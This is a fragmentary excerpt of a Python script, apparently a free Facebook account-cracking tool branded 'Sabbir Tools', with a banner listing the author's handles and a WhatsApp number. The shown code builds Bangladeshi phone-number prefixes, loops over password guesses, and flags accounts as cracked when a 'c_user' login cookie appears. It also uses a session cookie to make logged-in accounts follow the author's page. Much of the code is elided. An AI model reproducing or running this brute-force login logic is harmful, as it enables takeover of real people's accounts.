...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/mrsabbri?mibextid=ZbWKwL, {
...
ha = current.day
today = date.today()
#os.system('xdg-open https://facebook.com/groups/tsn fcd hacker team /')
os.system('espeak -a 300 " Welcome,   to,  Sabbir,  bro,  Tools"')
logo =("""
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
/$$$$$$   /$$$$$$  /$$$$$$$  /$$$$$$$  /$$$$$$ /$$$$$$$ 
 /$$__  $$ /$$__  $$| $$__  $$| $$__  $$|_  $$_/| $$__  $$
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-Sabbir ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • Md sabbir ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38msabbir-xm ]   ║\33[1;34m   
╠══[Whatsapp                 • 01310950046]  ║\33[1;35m 
╠══[TOOLS                    • Free  ]        ║ \33[1;32m   
...
def xxr():
    ...
    os.system("clear")
    print(logo)
    print(f' [{xr}+{x}] Example>: {xr}019,017,018,92302,92301,91778,93{x}')
    print("===============================================")
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0175'
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
               ...
               # print('\r\r\33[1;30m[Sabbir-CP] ' +uid+ ' • ' +ps+           '  \33[0;97m')
                ...
                os.system('espeak -a 300 " sabbir, CP,  id"')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}Sabbir-XD{x}]>~[%s]>~<[%s]-[OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
